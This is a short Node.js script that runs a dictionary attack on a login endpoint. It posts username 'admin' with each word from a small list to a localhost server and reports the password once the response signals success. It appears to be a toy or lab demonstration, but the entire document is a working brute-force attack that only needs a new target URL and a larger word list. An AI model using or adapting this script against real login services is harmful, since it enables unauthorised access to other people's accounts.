const axios = require('axios');

let thread = 0;
let maxThread = 50;
const dictionary = ['cat', 'dog', 'mouse'];

async function dictionaryAttack() {
    for (index = 0; index < dictionary.length; index++) {
        let word = dictionary[index];
        while (thread === maxThread) await new Promise(done => setTimeout(() => done(), 1));
        thread++;
        let postData = {
            username: 'admin',
            password: word
        };
        console.log(`Sending request with password = ${postData.password}`);
        try {
            let res = await axios.post('http://localhost:9090/', postData);
            console.log(res.data);
            if (res.data.success === true) return postData.password;
        } catch (err) {
            console.log(err);
        } finally {
            thread--;
        }
    }
}

async function findPassword() {
    let password = await dictionaryAttack();
    console.log(`Password is ${password}`);
}

findPassword();
